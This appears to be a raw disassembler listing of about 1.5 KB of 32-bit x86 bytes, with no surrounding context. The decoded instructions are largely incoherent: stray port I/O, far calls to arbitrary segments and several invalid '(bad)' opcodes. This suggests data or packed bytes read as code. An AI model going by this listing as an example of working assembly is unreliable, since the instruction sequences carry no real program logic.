  407438:	97                   	xchg   %eax,%edi
  407439:	64 3a 66 e5          	cmp    %fs:-0x1b(%esi),%ah
  40743d:	e1 c7                	loope  0x407406
  40743f:	98                   	cwtl
  407440:	97                   	xchg   %eax,%edi
  407441:	9b                   	fwait
  407442:	6a 99                	push   $0xffffff99
  407444:	5d                   	pop    %ebp
  407445:	7c b4                	jl     0x4073fb
  407447:	27                   	daa
  407448:	68 8c dc 61 68       	push   $0x6861dc8c
  40744d:	64 ba db 95 9a c5    	fs mov $0xc59a95db,%edx
  407453:	99                   	cltd
  407454:	68 11 1a 0c 68       	push   $0x680c1a11
  407459:	0e                   	push   %cs
  40745a:	3a 0e                	cmp    (%esi),%cl
  40745c:	24 a1                	and    $0xa1,%al
  40745e:	78 66                	js     0x4074c6
  407460:	02 64 d2 37          	add    0x37(%edx,%edx,8),%ah
  407464:	60                   	pusha
  407465:	64 3a 99 5d 7c b4 27 	cmp    %fs:0x27b47c5d(%ecx),%bl
  40746c:	68 8c c4 61 68       	push   $0x6861c48c
  407471:	64 d3 2b             	shrl   %cl,%fs:(%ebx)
  407474:	6b 64 3a eb ed       	imul   $0xffffffed,-0x15(%edx,%edi,1),%esp
  407479:	99                   	cltd
  40747a:	c4 99 97 34 b7 e3    	les    -0x1c48cb69(%ecx),%ebx
  407480:	99                   	cltd
  407481:	99                   	cltd
  407482:	c5 99 38 0c 7c a3    	lds    -0x5c83f3c8(%ecx),%ebx
  407488:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  40748c:	99                   	cltd
  40748d:	99                   	cltd
  40748e:	c5 99 38 8c 34 6c    	lds    0x6c348c38(%ecx),%ebx
  407494:	68 64 b9 a2 78       	push   $0x78a2b964
  407499:	0c c5                	or     $0xc5,%al
  40749b:	66 68 64 b7          	pushw  $0xb764
  40749f:	e3 95                	jecxz  0x407436
  4074a1:	9a c5 99 38 9b 0f 72 	lcall  $0x720f,$0x9b3899c5
  4074a8:	e6 25                	out    %al,$0x25
  4074aa:	3a 8e ec 63 3a 66    	cmp    0x663a63ec(%esi),%cl
  4074b0:	e8 d9 c7 98 97       	call   0x97d93c8e
  4074b5:	9b                   	fwait
  4074b6:	3a 13                	cmp    (%ebx),%dl
  4074b8:	48                   	dec    %eax
  4074b9:	0e                   	push   %cs
  4074ba:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  4074bd:	0c 35                	or     $0x35,%al
  4074bf:	a3 2a 64 50 66       	mov    %eax,0x6650642a
  4074c4:	80 8b 3d 66 68 9b 0f 	orb    $0xf,-0x649799c3(%ebx)
  4074cb:	72 e6                	jb     0x4074b3
  4074cd:	25 3a 8e f4 63       	and    $0x63f48e3a,%eax
  4074d2:	3a 66 81             	cmp    -0x7f(%esi),%ah
  4074d5:	8f                   	(bad)
  4074d6:	38 66 68             	cmp    %ah,0x68(%esi)
  4074d9:	e9 b7 9b 96 9b       	jmp    0x9bd71095
  4074de:	c5 e5 a0             	(bad)
  4074e1:	9b                   	fwait
  4074e2:	7a e6                	jp     0x4074ca
  4074e4:	54                   	push   %esp
  4074e5:	65 3a 13             	cmp    %gs:(%ebx),%dl
  4074e8:	91                   	xchg   %eax,%ecx
  4074e9:	e7 c2                	out    %eax,$0xc2
  4074eb:	65 1c 44             	gs sbb $0x44,%al
  4074ee:	50                   	push   %eax
  4074ef:	66 02 64 52 b6       	data16 add -0x4a(%edx,%edx,2),%ah
  4074f4:	ac                   	lods   %ds:(%esi),%al
  4074f5:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  4074f9:	8c 80 61 68 64 c5    	mov    %es,-0x3a9b979f(%eax)
  4074ff:	53                   	push   %ebx
  407500:	7c ea                	jl     0x4074ec
  407502:	7b 66                	jnp    0x40756a
  407504:	80 03 3d             	addb   $0x3d,(%ebx)
  407507:	66 68 8d 8c          	pushw  $0x8c8d
  40750b:	64 68 64 fc e3 93    	fs push $0x93e3fc64
  407511:	9a c5 99 68 8f 07 69 	lcall  $0x6907,$0x8f6899c5
  407518:	de e1                	fsubp  %st,%st(1)
  40751a:	c1 98 97 9b b0 e2 6d 	rcrl   $0x6d,-0x1d4f6469(%eax)
  407521:	99                   	cltd
  407522:	c4 99 97 58 0a 1a    	les    0x1a0a5897(%ecx),%ebx
  407528:	6c                   	insb   (%dx),%es:(%edi)
  407529:	58                   	pop    %eax
  40752a:	03 18                	add    (%eax),%ebx
  40752c:	48                   	dec    %eax
  40752d:	0e                   	push   %cs
  40752e:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  407531:	0c ea                	or     $0xea,%al
  407533:	a2 2a 64 50 66       	mov    %al,0x6650642a
  407538:	80 1f 3d             	sbbb   $0x3d,(%edi)
  40753b:	66 68 9b 0f          	pushw  $0xf9b
  40753f:	72 e6                	jb     0x407527
  407541:	25 3a 8e 40 63       	and    $0x63408e3a,%eax
  407546:	3a 66 81             	cmp    -0x7f(%esi),%ah
  407549:	13 38                	adc    (%eax),%edi
  40754b:	66 68 e4 bf          	pushw  $0xbfe4
  40754f:	9d                   	popf
  407550:	96                   	xchg   %eax,%esi
  407551:	9b                   	fwait
  407552:	c5 67 e2             	lds    -0x1e(%edi),%esp
  407555:	e1 c1                	loope  0x407518
  407557:	98                   	cwtl
  407558:	97                   	xchg   %eax,%edi
  407559:	9b                   	fwait
  40755a:	06                   	push   %es
  40755b:	65 1a dd             	gs sbb %ch,%bl
  40755e:	b3 9e                	mov    $0x9e,%bl
  407560:	69 9c b3 a1 e5 e1 c7 	imul   $0x6a9b9798,-0x381e1a5f(%ebx,%esi,4),%ebx
  407567:	98 97 9b 6a 
  40756b:	eb ed                	jmp    0x40755a
  40756d:	95                   	xchg   %eax,%ebp
  40756e:	c7                   	(bad)
  40756f:	99                   	cltd
  407570:	97                   	xchg   %eax,%edi
  407571:	34 52                	xor    $0x52,%al
  407573:	ed                   	in     (%dx),%eax
  407574:	ad                   	lods   %ds:(%esi),%eax
  407575:	26 3a eb             	es cmp %bl,%ch
  407578:	ed                   	in     (%dx),%eax
  407579:	95                   	xchg   %eax,%ebp
  40757a:	c7                   	(bad)
  40757b:	99                   	cltd
  40757c:	97                   	xchg   %eax,%edi
  40757d:	34 d2                	xor    $0xd2,%al
  40757f:	47                   	inc    %edi
  407580:	61                   	popa
  407581:	64 3a e5             	fs cmp %ch,%ah
  407584:	ac                   	lods   %ds:(%esi),%al
  407585:	74 52                	je     0x4075d9
  407587:	99                   	cltd
  407588:	68 64 3a eb ed       	push   $0xedeb3a64
  40758d:	99                   	cltd
  40758e:	c4 99 97 34 c5 53    	les    0x53c53497(%ecx),%ebx
  407594:	64 ea 7b 66 80 f3 3c 	fs ljmp $0x663c,$0xf380667b
  40759b:	66 
  40759c:	68 e4 87 9b 96       	push   $0x969b87e4
  4075a1:	9b                   	fwait
  4075a2:	c5 66 1d             	lds    0x1d(%esi),%esp
  4075a5:	44                   	inc    %esp
  4075a6:	50                   	push   %eax
  4075a7:	66 02 64 52 d3       	data16 add -0x2d(%edx,%edx,2),%ah
  4075ac:	ac                   	lods   %ds:(%esi),%al
  4075ad:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  4075b1:	8c 38                	mov    %?,(%eax)
  4075b3:	61                   	popa
  4075b4:	68 64 c5 53 64       	push   $0x6453c564
  4075b9:	ea 7b 66 80 cb 3c 66 	ljmp   $0x663c,$0xcb80667b
  4075c0:	68 8d c4 67 68       	push   $0x6867c48d
  4075c5:	64 fc                	fs cld
  4075c7:	e3 92                	jecxz  0x40755b
  4075c9:	9a c5 99 68 8f 07 69 	lcall  $0x6907,$0x8f6899c5
  4075d0:	de e1                	fsubp  %st,%st(1)
  4075d2:	c0 98 97 9b b0 e2 6d 	rcrb   $0x6d,-0x1d4f6469(%eax)
  4075d9:	99                   	cltd
  4075da:	c4 99 97 58 0a 1a    	les    0x1a0a5897(%ecx),%ebx
  4075e0:	6c                   	insb   (%dx),%es:(%edi)
  4075e1:	58                   	pop    %eax
  4075e2:	03 18                	add    (%eax),%ebx
  4075e4:	48                   	dec    %eax
  4075e5:	0e                   	push   %cs
  4075e6:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  4075e9:	0c a8                	or     $0xa8,%al
  4075eb:	a2 2a 64 50 66       	mov    %al,0x6650642a
  4075f0:	80 a7 3c 66 68 9b 0f 	andb   $0xf,-0x649799c4(%edi)
  4075f7:	6a e6                	push   $0xffffffe6
  4075f9:	25 3a 8e 18 62       	and    $0x62188e3a,%eax
  4075fe:	3a 66 81             	cmp    -0x7f(%esi),%ah
  407601:	db 3b                	fstpt  (%ebx)
  407603:	66 68 e4 bf          	pushw  $0xbfe4
  407607:	9c                   	pushf
  407608:	96                   	xchg   %eax,%esi
  407609:	9b                   	fwait
  40760a:	c5 67 e5             	lds    -0x1b(%edi),%esp
  40760d:	e9 c7 98 97 9b       	jmp    0x9bd80ed9
  407612:	b9 ae 97 24 ba       	mov    $0xba2497ae,%ecx
  407617:	5a                   	pop    %edx
  407618:	69 64 4f 9f 67 d2 af 	imul   $0x9cafd267,-0x61(%edi,%ecx,2),%esp
  40761f:	9c 
  407620:	96                   	xchg   %eax,%esi
  407621:	9b                   	fwait
  407622:	c5 5f aa             	lds    -0x56(%edi),%ebx
  407625:	16                   	push   %ss
  407626:	92                   	xchg   %eax,%edx
  407627:	ef                   	out    %eax,(%dx)
  407628:	90                   	nop
  407629:	65 c2 ef af          	gs ret $0xafef
  40762d:	e9 bf 9b 96 9b       	jmp    0x9bd711f1
  407632:	c5 36                	lds    (%esi),%esi
  407634:	e5 e1                	in     $0xe1,%eax
  407636:	cb                   	lret
  407637:	9b                   	fwait
  407638:	97                   	xchg   %eax,%edi
  407639:	9b                   	fwait
  40763a:	6a 0e                	push   $0xe
  40763c:	e3 a1                	jecxz  0x4075df
  40763e:	78 66                	js     0x4076a6
  407640:	e5 e1                	in     $0xe1,%eax
  407642:	cb                   	lret
  407643:	9b                   	fwait
  407644:	97                   	xchg   %eax,%edi
  407645:	9b                   	fwait
  407646:	6a 8e                	push   $0xffffff8e
  407648:	30 6c 3a 66          	xor    %ch,0x66(%edx,%edi,1)
  40764c:	eb a0                	jmp    0x4075ee
  40764e:	2a ef                	sub    %bh,%ch
  407650:	90                   	nop
  407651:	4d                   	dec    %ebp
  407652:	c2 ef af             	ret    $0xafef
  407655:	0e                   	push   %cs
  407656:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  407659:	0e                   	push   %cs
  40765a:	3e 0c 68             	ds or  $0x68,%al
  40765d:	0e                   	push   %cs
  40765e:	3a 0e                	cmp    (%esi),%cl
  407660:	68 64 3a 26 00       	push   $0x263a64
  407665:	54                   	push   %esp
  407666:	b4 27                	mov    $0x27,%ah
  407668:	68 8c c0 62 68       	push   $0x6862c08c
  40766d:	64 b3 e3             	fs mov $0xe3,%bl
  407670:	9c                   	pushf
  407671:	9a c5 99 02 66 50 66 	lcall  $0x6650,$0x660299c5
  407678:	02 64 c5 d3          	add    -0x2d(%ebp,%eax,8),%ah
  40767c:	9c                   	pushf
  40767d:	9a c5 99 80 63 3f 66 	lcall  $0x663f,$0x638099c5
  407684:	68 e9 37 56 e1       	push   $0xe15637e9
  407689:	24 3a                	and    $0x3a,%al
  40768b:	e5 a0                	in     $0xa0,%eax
  40768d:	9b                   	fwait
  40768e:	7a e6                	jp     0x407676
  407690:	54                   	push   %esp
  407691:	65 3a 13             	cmp    %gs:(%ebx),%dl
  407694:	91                   	xchg   %eax,%ecx
  407695:	ed                   	in     (%dx),%eax
  407696:	f9                   	stc
  407697:	0c 68                	or     $0x68,%al
  407699:	e9 af 8a 95 9b       	jmp    0x9bd6014d
  40769e:	c5 34 3b             	lds    (%ebx,%edi,1),%esi
  4076a1:	0c 0a                	or     $0xa,%al
  4076a3:	ef                   	out    %eax,(%dx)
  4076a4:	28 64 c5 d3          	sub    %ah,-0x2d(%ebp,%eax,8)
  4076a8:	9c                   	pushf
  4076a9:	9a c5 99 80 23 3f 66 	lcall  $0x663f,$0x238099c5
  4076b0:	68 0e 3a eb ed       	push   $0xedeb3a0e
  4076b5:	88 c7                	mov    %al,%bh
  4076b7:	99                   	cltd
  4076b8:	97                   	xchg   %eax,%edi
  4076b9:	34 50                	xor    $0x50,%al
  4076bb:	64 00 08             	add    %cl,%fs:(%eax)
  4076be:	f6 24 68             	mulb   (%eax,%ebp,2)
  4076c1:	9b                   	fwait
  4076c2:	8f                   	(bad)
  4076c3:	92                   	xchg   %eax,%edx
  4076c4:	96                   	xchg   %eax,%esi
  4076c5:	9b                   	fwait
  4076c6:	c5 8e 44 61 3a 66    	lds    0x663a6144(%esi),%ecx
  4076cc:	e1 9c                	loope  0x40766a
  4076ce:	0b 9e e1 a3 b7 eb    	or     -0x14485c1f(%esi),%ebx
  4076d4:	99                   	cltd
  4076d5:	99                   	cltd
  4076d6:	c5 99 eb ac c5 26    	lds    0x26c5aceb(%ecx),%ebx
  4076dc:	e8 58 3b 66 1d       	call   0x1da6b239
  4076e1:	9d                   	popf
  4076e2:	50                   	push   %eax
  4076e3:	66 e5 f1             	in     $0xf1,%ax
  4076e6:	d6                   	salc
  4076e7:	9b                   	fwait
  4076e8:	97                   	xchg   %eax,%edi
  4076e9:	9b                   	fwait
  4076ea:	68 36 e5 f9 cb       	push   $0xcbf9e536
  4076ef:	9b                   	fwait
  4076f0:	97                   	xchg   %eax,%edi
  4076f1:	9b                   	fwait
  4076f2:	69 99 dd 90 c4 99 97 	imul   $0x62c08c97,-0x663b6f23(%ecx),%ebx
  4076f9:	8c c0 62 
  4076fc:	68 64 50 66 e5       	push   $0xe5665064
  407701:	e1 d6                	loope  0x4076d9
  407703:	9b                   	fwait
  407704:	97                   	xchg   %eax,%edi
  407705:	9b                   	fwait
  407706:	6a 0c                	push   $0xc
  407708:	6a 0c                	push   $0xc
  40770a:	56                   	push   %esi
  40770b:	aa                   	stos   %al,%es:(%edi)
  40770c:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  407710:	9c                   	pushf
  407711:	9a c5 99 80 bb 3e 66 	lcall  $0x663e,$0xbb8099c5
  407718:	68 9b 8f 92 96       	push   $0x96928f9b
  40771d:	9b                   	fwait
  40771e:	c5 8e 10 67 3a 66    	lds    0x663a6710(%esi),%ecx
  407724:	97                   	xchg   %eax,%edi
  407725:	51                   	push   %ecx
  407726:	0e                   	push   %cs
  407727:	e9 29 64 d2 43       	jmp    0x4412db55
  40772c:	6e                   	outsb  %ds:(%esi),(%dx)
  40772d:	64 3a 0c 68          	cmp    %fs:(%eax,%ebp,2),%cl
  407731:	0e                   	push   %cs
  407732:	3a 0c 6c             	cmp    (%esp,%ebp,2),%cl
  407735:	0e                   	push   %cs
  407736:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  407739:	0c 3a                	or     $0x3a,%al
  40773b:	66 68 24 52          	pushw  $0x5224
  40773f:	46                   	inc    %esi
  407740:	e8 24 3a 8e 48       	call   0x48ceb169
  407745:	60                   	pusha
  407746:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  407749:	e1 ce                	loope  0x407719
  40774b:	98                   	cwtl
  40774c:	97                   	xchg   %eax,%edi
  40774d:	9b                   	fwait
  40774e:	bb 89 58 3b 3a       	mov    $0x3a3b5889,%ebx
  407753:	66 02 66 50          	data16 add 0x50(%esi),%ah
  407757:	66 02 64 c5 d3       	data16 add -0x2d(%ebp,%eax,8),%ah
  40775c:	9c                   	pushf
  40775d:	9a c5 99 80 43 3e 66 	lcall  $0x663e,$0x438099c5
  407764:	68 e9 37 e6 f9       	push   $0xf9e637e9
  407769:	26 3a e5             	es cmp %ch,%ah
  40776c:	a0 9b 7a e6 54       	mov    0x54e67a9b,%al
  407771:	65 3a 13             	cmp    %gs:(%ebx),%dl
  407774:	91                   	xchg   %eax,%ecx
  407775:	ed                   	in     (%dx),%eax
  407776:	f9                   	stc
  407777:	0c 68                	or     $0x68,%al
  407779:	e9 af 8a 95 9b       	jmp    0x9bd6022d
  40777e:	c5 34 3b             	lds    (%ebx,%edi,1),%esi
  407781:	0c ba                	or     $0xba,%al
  407783:	f7 2a                	imull  (%edx)
  407785:	64 c5 d3 9c          	(bad)
  407789:	9a c5 99 80 03 3e 66 	lcall  $0x663e,$0x38099c5
  407790:	68 0e 3a eb ed       	push   $0xedeb3a0e
  407795:	88 c7                	mov    %al,%bh
  407797:	99                   	cltd
  407798:	97                   	xchg   %eax,%edi
  407799:	34 50                	xor    $0x50,%al
  40779b:	67 00 f4             	addr16 add %dh,%ah
  40779e:	fe                   	(bad)
  40779f:	24 68                	and    $0x68,%al
  4077a1:	9b                   	fwait
  4077a2:	8f                   	(bad)
  4077a3:	92                   	xchg   %eax,%edx
  4077a4:	96                   	xchg   %eax,%esi
  4077a5:	9b                   	fwait
  4077a6:	c5 8e 24 60 3a 66    	lds    0x663a6024(%esi),%ecx
  4077ac:	97                   	xchg   %eax,%edi
  4077ad:	d1 ce                	ror    $1,%esi
  4077af:	98                   	cwtl
  4077b0:	97                   	xchg   %eax,%edi
  4077b1:	9b                   	fwait
  4077b2:	d2 83 6a 64 3a 0c    	rolb   %cl,0xc3a646a(%ebx)
  4077b8:	6d                   	insl   (%dx),%es:(%edi)
  4077b9:	9b                   	fwait
  4077ba:	0f 66 e6             	pcmpgtd %mm6,%mm4
  4077bd:	25 3a 8e 10 61       	and    $0x61108e3a,%eax
  4077c2:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  4077c5:	9c                   	pushf
  4077c6:	3b 9e e1 a3 d1 77    	cmp    0x77d1a3e1(%esi),%ebx
  4077cc:	97                   	xchg   %eax,%edi
  4077cd:	11 2e                	adc    %ebp,(%esi)
  4077cf:	99                   	cltd
  4077d0:	1d 74 c5 13 64       	sbb    $0x6413c574,%eax
  4077d5:	9b                   	fwait
  4077d6:	4f                   	dec    %edi
  4077d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4077d8:	80 eb 3f             	sub    $0x3f,%bl
  4077db:	66 68 3b 64          	pushw  $0x643b
  4077df:	3d a1 a6 2a 66       	cmp    $0x662aa6a1,%eax
  4077e4:	3d ed df 37 38       	cmp    $0x3837dfed,%eax
  4077e9:	37                   	aaa
  4077ea:	6c                   	insb   (%dx),%es:(%edi)
  4077eb:	31 e3                	xor    %esp,%ebx
  4077ed:	11 32                	adc    %esi,(%edx)
  4077ef:	d9 0e                	(bad) (%esi)
  4077f1:	79 5a                	jns    0x40784d
  4077f3:	0e                   	push   %cs
  4077f4:	e1 9c                	loope  0x407792
  4077f6:	0b 9e e1 a3 b1 23    	or     0x23b1a3e1(%esi),%ebx
  4077fc:	64 59                	fs pop %ecx
  4077fe:	3a 67 68             	cmp    0x68(%edi),%ah
  407801:	64 35 e3 fe 64 3a    	fs xor $0x3a64fee3,%eax
  407807:	66 e1 9c             	data16 loope 0x4077a6
  40780a:	13 9e e1 a3 b9 1b    	adc    0x1bb9a3e1(%esi),%ebx
  407810:	78 6d                	js     0x40787f
  407812:	35 e3 ee 64 3a       	xor    $0x3a64eee3,%eax
  407817:	66 53                	push   %bx
  407819:	51                   	push   %ecx
  40781a:	d2 eb                	shr    %cl,%bl
  40781c:	29 64 4f 6d          	sub    %esp,0x6d(%edi,%ecx,2)
  407820:	97                   	xchg   %eax,%edi
  407821:	51                   	push   %ecx
  407822:	4a                   	dec    %edx
  407823:	f6 2a                	imulb  (%edx)
  407825:	64 d2 23             	shlb   %cl,%fs:(%ebx)
  407828:	6c                   	insb   (%dx),%es:(%edi)
  407829:	64 3a 5d 5d          	cmp    %fs:0x5d(%ebp),%bl
  40782d:	14 aa                	adc    $0xaa,%al
  40782f:	24 68                	and    $0x68,%al
  407831:	11 31                	adc    %esi,(%ecx)
  407833:	99                   	cltd
  407834:	5d                   	pop    %ebp
  407835:	7c b4                	jl     0x4077eb
  407837:	27                   	daa
  407838:	68 8c 08 62 68       	push   $0x6862088c
  40783d:	64 bb a1 a8 6f 3a    	fs mov $0x3a6fa8a1,%ebx
  407843:	66 53                	push   %bx
  407845:	51                   	push   %ecx
  407846:	22 e8                	and    %al,%ch
  407848:	29 64 4f 6d          	sub    %esp,0x6d(%edi,%ecx,2)
  40784c:	97                   	xchg   %eax,%edi
  40784d:	51                   	push   %ecx
  40784e:	26 e3 28             	es jecxz 0x407879
  407851:	64 d2 7f 6c          	sarb   %cl,%fs:0x6c(%edi)
  407855:	64 3a 5d 5d          	cmp    %fs:0x5d(%ebp),%bl
  407859:	78 bf                	js     0x40781a
  40785b:	26 68 11 31 99 5d    	es push $0x5d993111
  407861:	70 b4                	jo     0x407817
  407863:	27                   	daa
  407864:	68 8c 3c 62 68       	push   $0x68623c8c
  407869:	64 01 53 7c          	add    %edx,%fs:0x7c(%ebx)
  40786d:	ea 7b 66 1d 6f c5 53 	ljmp   $0x53c5,$0x6f1d667b
  407874:	64 ea 7b 66 80 97 39 	fs ljmp $0x6639,$0x9780667b
  40787b:	66 
  40787c:	68 5f 0f 6a e6       	push   $0xe66a0f5f
  407881:	25 3a 13 71 9b       	and    $0x9b71133a,%eax
  407886:	0f 8e e5 25 3a 8e    	jle    0x8e7a9e71
  40788c:	88 67 3a             	mov    %ah,0x3a(%edi)
  40788f:	66 83 68 82 21       	subw   $0x21,-0x7e(%eax)
  407894:	6b 64 3a 91 8f       	imul   $0xffffff8f,-0x6f(%edx,%edi,1),%esp
  407899:	ed                   	in     (%dx),%eax
  40789a:	7f 9e                	jg     0x40783a
  40789c:	e1 a3                	loope  0x407841
  40789e:	0b bd 53 51 d2 eb    	or     -0x142daead(%ebp),%edi
  4078a4:	29 64 4f 60          	sub    %esp,0x60(%edi,%ecx,2)
  4078a8:	e3 79                	jecxz  0x407923
  4078aa:	1a e3                	sbb    %bl,%ah
  4078ac:	28 64 01 53          	sub    %ah,0x53(%ecx,%eax,1)
  4078b0:	18 f4                	sbb    %dh,%ah
  4078b2:	78 66                	js     0x40791a
  4078b4:	1d 62 b1 7b 40       	sbb    $0x407bb162,%eax
  4078b9:	ea 7b 66 53 51 22 e8 	ljmp   $0xe822,$0x5153667b
  4078c0:	29 64 4f 60          	sub    %esp,0x60(%edi,%ecx,2)
  4078c4:	e3 79                	jecxz  0x40793f
  4078c6:	2a e8                	sub    %al,%ch
  4078c8:	29 64 bb 89          	sub    %esp,-0x77(%ebx,%edi,4)
  4078cc:	93                   	xchg   %eax,%ebx
  4078cd:	75 3a                	jne    0x407909
  4078cf:	66 53                	push   %bx
  4078d1:	51                   	push   %ecx
  4078d2:	26 e3 28             	es jecxz 0x4078fd
  4078d5:	64 4f                	fs dec %edi
  4078d7:	60                   	pusha
  4078d8:	e3 79                	jecxz  0x407953
  4078da:	3a e6                	cmp    %dh,%ah
  4078dc:	28 64 01 53          	sub    %ah,0x53(%ecx,%eax,1)
  4078e0:	7c ea                	jl     0x4078cc
  4078e2:	7b 66                	jnp    0x40794a
  4078e4:	1d 62 b1 7b 00       	sbb    $0x7bb162,%eax
  4078e9:	f4                   	hlt
  4078ea:	78 66                	js     0x407952
  4078ec:	53                   	push   %ebx
  4078ed:	51                   	push   %ecx
  4078ee:	36 e8 29 64 4f 60    	ss call 0x608fdd1d
  4078f4:	e3 79                	jecxz  0x40796f
  4078f6:	16                   	push   %ss
  4078f7:	ef                   	out    %eax,(%dx)
  4078f8:	28 64 33 bd          	sub    %ah,-0x43(%ebx,%esi,1)
  4078fc:	1c 76                	sbb    $0x76,%al
  4078fe:	c5 13                	lds    (%ebx),%edx
  407900:	7c 9b                	jl     0x40789d
  407902:	4f                   	dec    %edi
  407903:	76 97                	jbe    0x40789c
  407905:	11 36                	adc    %esi,(%esi)
  407907:	30 3b                	xor    %bh,(%ebx)
  407909:	8c 50 62             	mov    %ss,0x62(%eax)
  40790c:	68 64 d1 60 e1       	push   $0xe160d164
  407911:	9c                   	pushf
  407912:	0b 9e e1 a3 65 38    	or     0x3865a3e1(%esi),%ebx
  407918:	33 ad f8 76 68 64    	xor    0x646876f8(%ebp),%ebp
  40791e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407921:	41                   	inc    %ecx
  407922:	3a b5 2a 64 aa f6    	cmp    -0x9559bd6(%ebp),%dh
  407928:	68 64 3a 66 97       	push   $0x97663a64
  40792d:	41                   	inc    %ecx
  40792e:	3e b5 2a             	ds mov $0x2a,%ch
  407931:	64 aa                	fs stos %al,%es:(%edi)
  407933:	f6 68 64             	imulb  0x64(%eax)
  407936:	3a 66 97             	cmp    -0x69(%esi),%ah
  407939:	41                   	inc    %ecx
  40793a:	32 b5 2a 64 aa f6    	xor    -0x9559bd6(%ebp),%dh
  407940:	68 64 3a 66 97       	push   $0x97663a64
  407945:	41                   	inc    %ecx
  407946:	36 b5 2a             	ss mov $0x2a,%ch
  407949:	64 aa                	fs stos %al,%es:(%edi)
  40794b:	f6 68 64             	imulb  0x64(%eax)
  40794e:	3a 66 97             	cmp    -0x69(%esi),%ah
  407951:	41                   	inc    %ecx
  407952:	22 b5 2a 64 aa f6    	and    -0x9559bd6(%ebp),%dh
  407958:	68 64 3a 66 97       	push   $0x97663a64
  40795d:	41                   	inc    %ecx
  40795e:	1e                   	push   %ds
  40795f:	b5 2a                	mov    $0x2a,%ch
  407961:	64 aa                	fs stos %al,%es:(%edi)
  407963:	f6 68 64             	imulb  0x64(%eax)
  407966:	3a 66 97             	cmp    -0x69(%esi),%ah
  407969:	41                   	inc    %ecx
  40796a:	12 b5 2a 64 aa f6    	adc    -0x9559bd6(%ebp),%dh
  407970:	68 64 3a 66 97       	push   $0x97663a64
  407975:	41                   	inc    %ecx
  407976:	16                   	push   %ss
  407977:	b5 2a                	mov    $0x2a,%ch
  407979:	64 aa                	fs stos %al,%es:(%edi)
  40797b:	f6 68 64             	imulb  0x64(%eax)
  40797e:	3a 66 3d             	cmp    0x3d(%esi),%ah
  407981:	ed                   	in     (%dx),%eax
  407982:	df 37                	fbstp  (%edi)
  407984:	3f                   	aas
  407985:	8c 84 66 68 64 b3 a1 	mov    %es,-0x5e4c9b98(%esi,%eiz,2)
  40798c:	e8 5b 18 13 4b       	call   0x4b5391ec
  407991:	0e                   	push   %cs
  407992:	18 ef                	sbb    %ch,%bh
  407994:	90                   	nop
  407995:	24 6a                	and    $0x6a,%al
  407997:	8e 50 61             	mov    0x61(%eax),%ss
  40799a:	3a 66 eb             	cmp    -0x15(%esi),%ah
  40799d:	a0 32 ef 2d 98       	mov    0x982def32,%al
  4079a2:	33 a6 1c 4d b3 a1    	xor    -0x5e4cb2e4(%esi),%esp
  4079a8:	2f                   	das
  4079a9:	8f                   	(bad)
  4079aa:	3b 21                	cmp    (%ecx),%esp
  4079ac:	e8 5b 1a 12 92       	call   0x9252940c
  4079b1:	8f                   	(bad)
  4079b2:	26 21 67 da          	and    %esp,%es:-0x26(%edi)
  4079b6:	3d 6f a8 10 3f       	cmp    $0x3f10a86f,%eax
  4079bb:	e5 90                	in     $0x90,%eax
  4079bd:	44                   	inc    %esp
  4079be:	4f                   	dec    %edi
  4079bf:	95                   	xchg   %eax,%ebp
  4079c0:	83 65 7d 69          	andl   $0x69,0x7d(%ebp)
  4079c4:	d6                   	salc
  4079c5:	63 33                	arpl   %esi,(%ebx)
  4079c7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4079c8:	1c 61                	sbb    $0x61,%al
  4079ca:	b9 9e 48 10 c9       	mov    $0xc910489e,%ecx
  4079cf:	0c 68                	or     $0x68,%al
  4079d1:	8c 80 66 68 64 50    	mov    %es,0x50646866(%eax)
  4079d7:	67 3f                	addr16 aas
  4079d9:	0e                   	push   %cs
  4079da:	3a 36                	cmp    (%esi),%dh
  4079dc:	80 2c c8 99          	subb   $0x99,(%eax,%ecx,8)
  4079e0:	97                   	xchg   %eax,%edi
  4079e1:	3b f3                	cmp    %ebx,%esi
  4079e3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4079e4:	31 e5                	xor    %esp,%ebp
  4079e6:	d6                   	salc
  4079e7:	66 78 64             	data16 js 0x407a4e
  4079ea:	3a 4b 68             	cmp    0x68(%ebx),%cl
  4079ed:	74 3a                	je     0x407a29
  4079ef:	66 ed                	in     (%dx),%ax
  4079f1:	60                   	pusha
  4079f2:	1e                   	push   %ds
  4079f3:	5b                   	pop    %ebx
  4079f4:	68 74 3a 66 1b       	push   $0x1b663a74
  4079f9:	8f                   	(bad)
  4079fa:	13 a2 ed 60 1e 99    	adc    -0x66e19f13(%edx),%esp
  407a00:	89 64 3a 66          	mov    %esp,0x66(%edx,%edi,1)
  407a04:	e3 30                	jecxz  0x407a36
  407a06:	1e                   	push   %ds
  407a07:	6e                   	outsb  %ds:(%esi),(%dx)
  407a08:	59                   	pop    %ecx
  407a09:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407a0a:	83 99 97 9b c5 e1 92 	sbbl   $0xffffff92,-0x1e3a6469(%ecx)
  407a11:	96                   	xchg   %eax,%esi
  407a12:	94                   	xchg   %eax,%esp
  407a13:	91                   	xchg   %eax,%ecx
  407a14:	b1 e9                	mov    $0xe9,%cl
  407a16:	73 99                	jae    0x4079b1
  407a18:	e3 20                	jecxz  0x407a3a
  407a1a:	1e                   	push   %ds
  407a1b:	6e                   	outsb  %ds:(%esi),(%dx)
  407a1c:	fe                   	(bad)
  407a1d:	ef                   	out    %eax,(%dx)
  407a1e:	46                   	inc    %esi
  407a1f:	42                   	inc    %edx
  407a20:	6c                   	insb   (%dx),%es:(%edi)
  407a21:	97                   	xchg   %eax,%edi
  407a22:	9e                   	sahf
  407a23:	f0 ef                	lock out %eax,(%dx)
  407a25:	b3 b1                	mov    $0xb1,%bl
  407a27:	22 4c 60 f8          	and    -0x8(%eax,%eiz,2),%cl
